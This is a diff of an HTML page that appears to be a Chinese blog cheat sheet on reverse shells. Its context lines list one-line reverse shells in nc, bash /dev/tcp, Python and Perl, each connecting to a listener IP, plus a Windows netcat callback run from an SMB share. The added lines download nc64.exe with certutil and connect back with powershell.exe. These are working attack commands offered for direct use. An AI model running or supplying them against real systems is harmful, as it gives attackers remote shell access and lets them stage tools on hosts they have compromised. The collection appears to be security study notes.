@@ -52,7 +52,7 @@ script -qc /bin/bash /dev/null script 时 Linux 系统自带的命令，用于�
 反弹 shell Linux Nc nc -e /bin/bash 10.10.10.5 4444 Bash bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.10.5/4444 0&gt;&amp;1&#34; Python python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.10.5&#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/bash&#34;,&#34;-i&#34;]);&#39; Perl perl -e &#39;use Socket;$i=&#34;10.10.10.5&#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39; Msfvenom Msf 生成反弹 shell">
   <meta itemprop="datePublished" content="2026-03-01T21:00:00+08:00">
   <meta itemprop="dateModified" content="2026-03-01T21:00:00+08:00">
-  <meta itemprop="wordCount" content="126">
+  <meta itemprop="wordCount" content="147">
   <meta itemprop="keywords" content="Hack">
 
   <meta name="twitter:card" content="summary">
@@ -184,6 +184,8 @@ script -qc /bin/bash /dev/null script 时 Linux 系统自带的命令，用于�
 </span></span></code></pre></div><h3 id="windows">Windows</h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>START /B <span style="color:#ae81ff">\\</span>10.10.16.155<span style="color:#ae81ff">\E</span>nil<span style="color:#ae81ff">\n</span>c64.exe 10.10.16.155 <span style="color:#ae81ff">443</span> -e cmd.exe
 </span></span></code></pre></div><p>启动后台运行，使用共享文件夹的 nc 绑定回连端口的 cmd。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certutil.exe -urlcache -split -f http://10.10.16.58/nc64.exe C:<span style="color:#ae81ff">\P</span>rogramdata<span style="color:#ae81ff">\n</span>c64.exe C:<span style="color:#ae81ff">\P</span>rogramdata<span style="color:#ae81ff">\n</span>c64.exe 10.10.16.58 <span style="color:#ae81ff">443</span> -e powershell.exe
+</span></span></code></pre></div><p>从 Kali 中下载 nc64.exe 到 Programdata 下，再使用 nc64 回连至 Kali。</p>
 
             </div>
         </article>
